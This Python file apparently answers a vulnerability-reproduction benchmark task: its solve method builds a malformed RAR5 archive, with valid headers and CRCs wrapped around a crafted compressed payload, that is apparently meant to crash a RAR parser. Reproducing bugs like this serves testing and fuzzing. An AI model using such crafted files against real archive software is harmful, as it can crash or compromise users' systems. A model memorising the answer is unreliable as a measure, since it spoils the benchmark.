import zlib
import struct

class Solution:
    @staticmethod
    def _to_vint(n: int) -> bytes:
        b = bytearray()
        if n == 0:
            return b'\x00'
        while n > 0:
            b.insert(0, n & 0x7f)
            n >>= 7
        if len(b) > 1:
            for i in range(len(b) - 1):
                b[i] |= 0x80
        return bytes(b)

    def solve(self, src_path: str) -> bytes:
        poc = bytearray()
        
        poc.extend(b'\x52\x61\x72\x21\x1a\x07\x01\x00')

        main_header_data = self._to_vint(1) + self._to_vint(0)
        main_header_block = self._to_vint(len(main_header_data)) + main_header_data
        main_header_crc = zlib.crc32(main_header_block)
        poc.extend(struct.pack('<I', main_header_crc))
        poc.extend(main_header_block)

        payload = b'\x80'
        payload += self._to_vint(0)
        payload += b'\x80\x80'
        payload += b'\x04\x00\x00\x00\x00\x00\x00\x80'
        payload += b'\x7f\xff\xff\x80'
        packed_size = len(payload)

        file_header_data_part1 = self._to_vint(2) + self._to_vint(0)
        
        file_flags = 0
        unpacked_size = 1
        file_attr = 0x20
        file_crc = 0
        comp_info = 64
        host_os = 2
        file_name = b'a'

        file_header_data_part2 = (
            self._to_vint(file_flags) +
            self._to_vint(packed_size) +
            self._to_vint(unpacked_size) +
            self._to_vint(file_attr) +
            struct.pack('<I', file_crc) +
            self._to_vint(comp_info) +
            self._to_vint(host_os) +
            self._to_vint(len(file_name)) +
            file_name
        )
        
        file_header_data = file_header_data_part1 + file_header_data_part2
        file_header_block = self._to_vint(len(file_header_data)) + file_header_data
        file_header_crc = zlib.crc32(file_header_block)

        poc.extend(struct.pack('<I', file_header_crc))
        poc.extend(file_header_block)
        
        poc.extend(payload)
        
        end_header_data = self._to_vint(5) + self._to_vint(0x4000)
        end_header_block = self._to_vint(len(end_header_data)) + end_header_data
        end_header_crc = zlib.crc32(end_header_block)
        
        poc.extend(struct.pack('<I', end_header_crc))
        poc.extend(end_header_block)

        return bytes(poc)
